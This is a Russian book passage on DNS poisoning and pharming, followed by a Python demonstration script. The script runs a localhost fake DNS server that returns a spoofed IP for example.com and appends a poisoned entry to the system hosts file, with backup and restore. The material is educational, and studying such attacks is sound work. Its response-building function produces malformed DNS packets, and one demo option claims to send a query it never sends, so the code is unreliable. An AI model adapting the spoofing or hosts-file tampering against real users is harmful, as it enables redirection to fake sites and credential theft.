# Отравление сетевой инфраструктуры
# Как и в случае с веб-серверами, множество различных типов атак используют
# уязвимости в сетевой инфраструктуре, и постоянно обнаруживаются новые
# слабые места. Подавляющее большинство вопросов этой темы выходит за
# рамки данной книги. Тем не менее, как и в случае с зараженными вебсерверами, вам необходимо понимать основные концепции серверных атак,
# поскольку некоторые такие атаки могут напрямую повлиять на вас.
# Например, преступники могут использовать различные уязвимости, чтобы
# добавить поврежденные данные системы доменных имен (DNS) на DNSсервер. DNS - это каталог Интернета, который преобразует адреса, читаемые
# человеком, в их цифровые эквиваленты, используемые компьютером (IPадреса). Например, если вы введете https://JosephSteinberg.com в вашем
# веб-браузере DNS направляет ваше соединение на адрес, состоящий из
# четырех цифр, меньших 256 и разделенных точками, например,
# 104.18.45.53.
# Вводя неверную информацию в таблицы DNS, преступник может заставить
# DNS-сервер вернуть неверный IP-адрес компьютеру пользователя. Такая
# атака может легко привести к перенаправлению трафика пользователя на
# компьютер по выбору злоумышленника вместо предполагаемого пункта
# назначения пользователя. Например, если преступник устанавливает сайт
# фальшивого банка на сервере, на который перенаправляется трафик, и выдает
# себя на этом сервере за банк, к которому пользователь пытался дозвониться,
# даже пользователь, который вводит URL-адрес банка в браузере (в отличие от
# простого нажатия на ссылку), может стать жертвой перенаправления на
# фальшивый сайт. (Этот тип атаки известен как отравление DNS или
# фарминг.)

# ===================================================================================================================================================

"""
DNS Cache Poisoning Demonstration (Pure Python - No Scapy)
-----------------------------------------------------------
Использует только стандартную библиотеку Python.
Демонстрирует принцип отравления DNS (фарминг) через изменение hosts-файла
и эмуляцию DNS-сервера-нарушителя.
"""

import socket
import threading
import time
import os
import sys

# Конфигурация
SPOOF_DOMAIN = "example.com"
FAKE_IP = "192.0.2.100"  # Тестовый IP (не маршрутизируется)

class SimpleDNSpoisonDemo:
    def __init__(self):
        self.running = False
        self.dns_records = {
            SPOOF_DOMAIN: FAKE_IP,  # Отравленная запись
            "google.com": "142.250.185.46",  # Нормальная запись
            "github.com": "140.82.112.3",
        }
    
    def start_fake_dns_server(self, port = 5353):
        """Запускает поддельный DNS-сервер (только для демонстрации)"""
        self.running = True
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('127.0.0.1', port))
        
        print(f"[*] Фальшивый DNS-сервер запущен на порту {port}")
        print(f"[*] Отравленные записи: {SPOOF_DOMAIN} -> {FAKE_IP}\n")
        
        while self.running:
            try:
                server_socket.settimeout(1.0)
                data, addr = server_socket.recvfrom(512)
                
                # Простой парсинг DNS-запроса (для демонстрации)
                # В реальности здесь нужен полный парсер DNS
                domain = self.extract_domain_from_dns(data)
                
                if domain and domain in self.dns_records:
                    print(f"[!] ПОЛУЧЕН ЗАПРОС: {domain} от {addr}")
                    print(f"[!] ОТРАВЛЕННЫЙ ОТВЕТ: {domain} -> {self.dns_records[domain]}")
                    
                    # Формируем простой DNS-ответ
                    response = self.create_fake_dns_response(data, self.dns_records[domain])
                    server_socket.sendto(response, addr)
                elif domain:
                    print(f"[*] Игнорирую запрос к {domain} (не в списке подмены)")
                    
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Ошибка: {e}")
        
        server_socket.close()
    
    def extract_domain_from_dns(self, data):
        """Упрощённый парсинг DNS-запроса для извлечения домена"""
        try:
            # DNS-запрос начинается с 12-байтового заголовка
            if len(data) < 12:
                return None
            
            # Пропускаем заголовок и переходим к вопросу
            pos = 12
            domain_parts = []
            
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                domain_parts.append(data[pos:pos + length].decode('ascii', errors = 'ignore'))
                pos += length
            
            return '.'.join(domain_parts) if domain_parts else None
        except:
            return None
    
    def create_fake_dns_response(self, query, fake_ip):
        """Создаёт поддельный DNS-ответ"""
        # Очень упрощённый ответ (работает только для демонстрации)
        # В реальной атаке нужен полноценный DNS-ответ
        
        transaction_id = query[:2]
        
        # Заголовок ответа (qr=1, aa=1, ra=1)
        header = transaction_id + b'\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00'
        
        # Вопрос (копируем из запроса)
        question = query[12:query.find(b'\x00', 12) + 1]
        
        # Ответ: домен + тип A (1) + класс IN (1) + TTL + IP
        answer = (
            question +  # Имя домена
            b'\x00\x01' +  # Тип A
            b'\x00\x01' +  # Класс IN
            b'\x00\x00\x00\x3c' +  # TTL 60 секунд
            b'\x00\x04' +  # Длина данных (4 байта для IPv4)
            socket.inet_aton(fake_ip)  # IP-адрес
        )
        
        return header + question + answer
    
    def show_normal_resolution(self, domain):
        """Показывает нормальное разрешение DNS"""
        try:
            ip = socket.gethostbyname(domain)
            print(f"[+] Нормальный DNS: {domain} -> {ip}")
            return ip
        except socket.gaierror:
            print(f"[-] Не удалось разрешить {domain}")
            return None

class HostsFilePoisoner:
    """Демонстрация через изменение файла hosts (требует прав администратора)"""
    
    @staticmethod
    def backup_hosts():
        """Создаёт резервную копию файла hosts"""
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if sys.platform == "win32" else "/etc/hosts"
        backup_path = hosts_path + ".backup"
        
        try:
            if not os.path.exists(backup_path):
                with open(hosts_path, 'r', encoding = 'utf-8') as src:
                    with open(backup_path, 'w', encoding = 'utf-8') as dst:
                        dst.write(src.read())
                print(f"[✓] Резервная копия создана: {backup_path}")
            return True
        except PermissionError:
            print("[✗] Нужны права администратора для работы с hosts-файлом")
            return False
    
    @staticmethod
    def add_poison_record(domain, fake_ip):
        """Добавляет отравленную запись в hosts-файл"""
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if sys.platform == "win32" else "/etc/hosts"
        
        try:
            with open(hosts_path, 'a', encoding = 'utf-8') as f:
                f.write(f"\n# DNS Poisoning Demo (educational)\n{fake_ip}    {domain}\n")
            print(f"[✓] Добавлена запись: {fake_ip} {domain}")
            return True
        except PermissionError:
            print("[✗] Ошибка: запустите программу с правами администратора")
            return False
    
    @staticmethod
    def restore_hosts():
        """Восстанавливает оригинальный hosts-файл"""
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts" if sys.platform == "win32" else "/etc/hosts"
        backup_path = hosts_path + ".backup"
        
        try:
            if os.path.exists(backup_path):
                with open(backup_path, 'r', encoding = 'utf-8') as src:
                    with open(hosts_path, 'w', encoding = 'utf-8') as dst:
                        dst.write(src.read())
                print("[✓] Hosts-файл восстановлен")
                return True
        except PermissionError:
            print("[✗] Не удалось восстановить hosts-файл")
            return False

def demonstrate_pharming():
    """Демонстрирует принцип фарминга (отравление DNS)"""
    print("=" * 70)
    print("ДЕМОНСТРАЦИЯ ФАРМИНГА (DNS Cache Poisoning / Pharming)")
    print("=" * 70)
    print("\n📖 Что такое фарминг?")
    print("  - Злоумышленник подменяет DNS-записи")
    print("  - Пользователь вводит правильный URL, но попадает на фальшивый сайт")
    print("  - Даже ручной ввод адреса не спасает\n")
    
    print(f"🎯 Цель демонстрации: {SPOOF_DOMAIN} -> {FAKE_IP} (поддельный IP)")
    
    # Проверяем текущее разрешение
    print("\n🔍 ТЕКУЩЕЕ СОСТОЯНИЕ:")
    real_ip = socket.gethostbyname(SPOOF_DOMAIN)
    print(f"  {SPOOF_DOMAIN} реально разрешается в: {real_ip}")
    
    if real_ip == FAKE_IP:
        print("  ⚠️  УЖЕ ОТРАВЛЕНО! (возможно, есть запись в hosts)")
    else:
        print("  ✓ Нормальное состояние")
    
    print("\n" + "=" * 70)
    print("ВАРИАНТЫ ДЕМОНСТРАЦИИ:")
    print("=" * 70)
    print("1. Изменить системный файл hosts (требует администратора)")
    print("2. Запустить поддельный DNS-сервер (эмуляция)")
    print("3. Только теория и объяснение\n")
    
    choice = input("Выберите вариант (1/2/3): ")
    
    if choice == "1":
        print("\n--- ДЕМОНСТРАЦИЯ ЧЕРЕЗ HOSTS-ФАЙЛ ---")
        if HostsFilePoisoner.backup_hosts():
            if HostsFilePoisoner.add_poison_record(SPOOF_DOMAIN, FAKE_IP):
                print("\n[!] ТЕПЕРЬ ПРОВЕРЬТЕ РАЗРЕШЕНИЕ:")
                time.sleep(1)
                new_ip = socket.gethostbyname(SPOOF_DOMAIN)
                print(f"[!] {SPOOF_DOMAIN} -> {new_ip}")
                
                if new_ip == FAKE_IP:
                    print("\n✅ ФАРМИНГ УСПЕШЕН!")
                    print("   Пользователь, вводя example.com, попадает на фальшивый IP!")
                    print("   Это точная иллюстрация атаки из текста.\n")
                    
                    input("Нажмите Enter для восстановления системы...")
                    HostsFilePoisoner.restore_hosts()
                else:
                    print("[-] Что-то пошло не так")
    
    elif choice == "2":
        print("\n--- ЭМУЛЯЦИЯ ФАЛЬШИВОГО DNS-СЕРВЕРА ---")
        demo = SimpleDNSpoisonDemo()
        
        print("\n[!] ВНИМАНИЕ: Эта эмуляция показывает ПРИНЦИП атаки")
        print("   В реальной атаке злоумышленник:")
        print("   1. Перехватывает DNS-запросы жертвы")
        print("   2. Отправляет поддельный ответ БЫСТРЕЕ настоящего")
        print("   3. Использует уязвимости DNS-сервера для отравления кэша\n")
        
        print("Запуск фальшивого DNS-сервера на порту 5353...")
        print("(Этот сервер будет отвечать на запросы к example.com фальшивым IP)\n")
        
        server_thread = threading.Thread(target = demo.start_fake_dns_server, args = (5353,), daemon = True)
        server_thread.start()
        
        print("Проверка: как работает подмена?")
        print("  Сейчас мы отправим запрос к 127.0.0.1:5353 (наш фальшивый сервер)")
        print("  В реальной атаке клиент обращался бы к настоящему DNS-серверу,\n"
              "  но злоумышленник перехватывает трафик\n")
        
        print("Нажмите Ctrl+C для завершения демонстрации")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Демонстрация завершена")
    
    else:
        print("\n--- ТЕОРЕТИЧЕСКОЕ ОБЪЯСНЕНИЕ ---")
        print("""
Как работает фарминг из вашего текста:

1. Нормальная работа DNS:
   Пользователь: вводит https://JosephSteinberg.com
   DNS-сервер: возвращает 104.18.45.53

2. Атака (отравление DNS-кэша):
   Преступник: внедряет неверные данные на DNS-сервер
   DNS-сервер: начинает возвращать фальшивый IP (например, 192.0.2.100)

3. Результат:
   Пользователь вводит правильный URL → попадает на фальшивый сайт
   Даже если вводит адрес вручную!

4. Почему это опасно:
   - Фальшивый сайт может выглядеть как настоящий банк
   - Пользователь вводит логин/пароль злоумышленнику
   - Атака незаметна для жертвы

5. Защита:
   - DNSSEC (цифровая подпись DNS-записей)
   - Использование доверенных DNS-серверов
   - Регулярное обновление DNS-серверов
        """)

if __name__ == "__main__":
    demonstrate_pharming()